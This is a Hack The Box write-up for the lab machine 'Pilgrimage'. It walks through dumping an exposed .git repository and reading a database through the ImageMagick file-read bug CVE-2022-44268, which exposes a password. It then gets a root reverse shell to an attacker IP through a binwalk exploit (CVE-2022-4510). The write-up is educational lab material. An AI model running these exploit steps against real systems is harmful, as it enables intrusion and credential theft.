---
title:  "HTB Pilgrimage Writeup"
date:   2023-11-25 00:30:00 
categories: HTB Machine
tags: CVE-2022-4510 CVE-2022-44268 LFI git
---



![Pilgrimage](/assets/img/Pilgrimage/1687444210829.jpg)

## Introduction

Pilgrimage was an easy Linux machine that focused heavily on enemeration of web directories running process and the abuse of publicly known vulnerabilities


If you like any of my content it would help a lot if you used my referral link to buy Hack the box/ Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start our recon off we will start with an Nmap scan of the machine. using the following command
```
sudo nmap -sS -A  -o nmap  10.10.11.219
```
**Nmap**
```
Nmap scan report for 10.10.11.219
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=11/25%OT=22%CT=1%CU=43725%PV=Y%DS=2%DC=T%G=Y%TM=6561FC
OS:82%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST
OS:11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   30.68 ms 10.10.14.1
2   24.88 ms 10.10.11.219

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 25 08:54:10 2023 -- 1 IP address (1 host up) scanned in 23.85 seconds
```

Looking at the output of the Nmap scan i decided to check out the web pages first located at port **80**. This web application seems to have only one functionality where it shrinks any file you give it as input. At this point it wasn't clear what was exploitable about this feature so further enumeration was required.

![Pilgrimage](/assets/img/Pilgrimage/Pilgrimage_01.png)

When running gobuster on this url to detect any hidden files on the webserver I noticed that **/.git/index** Was found on the webserver which is an indicator that the git repo of this application was still reachable through the website.

```
GET /.git/index HTTP/1.1
Host: pilgrimage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=agit0fjgj2oc750d4ddor38tk2
Upgrade-Insecure-Requests: 1

```

The server then issued the following valid response.

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 25 Nov 2023 14:06:46 GMT
Content-Type: application/octet-stream
Content-Length: 3768
Last-Modified: Wed, 07 Jun 2023 10:10:41 GMT
Connection: close
ETag: "648057a1-eb8"
Accept-Ranges: bytes

DIRC
<snipped>
```

So now we have proof that there is a git repo present on the webserver the next step is to dump the entire github repo from the url. This can be done using the [Gitdump](https://github.com/Ebryx/GitDump) using the following command

```bash
python3 git-dump.py http://pilgrimage.htb
```

Then do the following commands to go into the git directory and recover the source code from the git objects

```
cd output && git checkout -- .
```

![Source_code](/assets/img/Pilgrimage/Pilgrimage_02.png)

When looking through the source code the following code snippet of the index.php page was interesting
```php
session_start();
require_once "assets/bulletproof.php";

function isAuthenticated() {
  return json_encode(isset($_SESSION['user']));
}

function returnUsername() {
  return "\"" . $_SESSION['user'] . "\"";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
    }
  }
  else {
    header("Location: /?message=Image shrink failed&status=fail");
  }
}
```

With the following line we could see that the magick binary was being used to shrink the files

```php
exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
```

Then next we could also see that the application was using a sqlite database including its full file path.

```php
$db = new PDO('sqlite:/var/db/pilgrimage');
```
### Exploiting the LFI

Both these pieces of info are interesting but it doesn't give us any way forward just yet. Next i looked deeper into the **magick** binary that they were using to check if this was using an outdated version.

```
./magick -version
```
![Magick exploitable](/assets/img/Pilgrimage/Pilgrimage_03.png)


This command showed us that it was using version **ImageMagick 7.1.0-49 beta Q16-HDRI**. Which is found vulnerable to an [arbitrary file read vulnerability](https://www.exploit-db.com/exploits/51261). which can be exploited using the following public [exploit](https://github.com/voidz0r/CVE-2022-44268).

So seeing it is vulnerable to an arbitrary file read vulnerability I wanted to try and grab the sqlite database since sqlite databases are just stored in one big file.

```
cargo run '/var/db/pilgrimage'
```

![Magick exploit](/assets/img/Pilgrimage/Pilgrimage_04.png)


Now that we have our file with the exploit embedded within we need to upload it on the website. After uploading the image successfully we will get a url where we can retrieve this file again.

![Magick exploit](/assets/img/Pilgrimage/Pilgrimage_05.png)

next step is to download this file again and use the identify command on it to get the data of the sqlite database we're trying to exfiltrate. I chose to write the output to a txt file because it would otherwise be too much to fit on a terminal.

```
identify -verbose 656208d131ab8.png > output.txt
```

![Exploit_worked](/assets/img/Pilgrimage/Pilgrimage_06.png)


Now that we have all the date I placed this in cyberchef and downloaded the sqlite file by using the recipe **From Hex**.

![Cyberchef](/assets/img/Pilgrimage/Pilgrimage_07.png)


So now we have the database of the application. We can access it using the following command. Then after we can dump its contents using the **.dump** command.

```bash
sqlite3 pilgrimage.sqlite
.dump
```

![Emily's credentials](/assets/img/Pilgrimage/Pilgrimage_08.png)

So now we could log in to Emily's account using the password **abigchonkyboi123**

```
ssh emily@pilgrimage.htb
```

## privilege escalation

Going through the basic privesc steps using Linpeas I didn't specifically notice anything in particular. Because of this i thought it would be interesting to use pspy to check what was running on the machine while it was being used normally. i setup a webserver using python to make it easy for me to download the binary onto the machine.

```
python -m http.server 80
```

Then download the binary using the following commands

```bash
curl http://10.10.14.51/pspy64 -o pspy
chmod +x ./pspy
./pspy
```

At first sight not much special was going on however whenever an image was uploaded a bash script called **usr/sbin/malwarescan.sh** was being ran as root. We could check what this script was doing by reading its contents

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

Looking at this script it seems pretty straight forward. it just runs binwalk on the file and checks if it is a blacklisted file. I decided to check the version of binwalk to check if there weren't any publicly known exploits for this version.

```bash
/usr/local/bin/binwalk -h
```

![Binwalk version](/assets/img/Pilgrimage/Pilgrimage_09.png)


checking the version disclosed I found there was indeed a public [exploit](https://www.exploit-db.com/exploits/51249) for this version that would allow us to get remote code execution. in this case it would be as root. I copied the exploit code onto the machine and then ran it on a random image i found.

```bash
python3 exploit.py 65620e2869bcb.png 10.10.14.51 443
```

![Exploit privesc](/assets/img/Pilgrimage/Pilgrimage_10.png)

Next we move the file to the **/var/www/pilgrimage.htb/shrunk/** directory to have the script pick it up.

```bash
cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/65620e2869bc2.png
```

Then a few moments later the reverse shell would open up giving me access with the root account.

![Root](/assets/img/Pilgrimage/Pilgrimage_11.png)
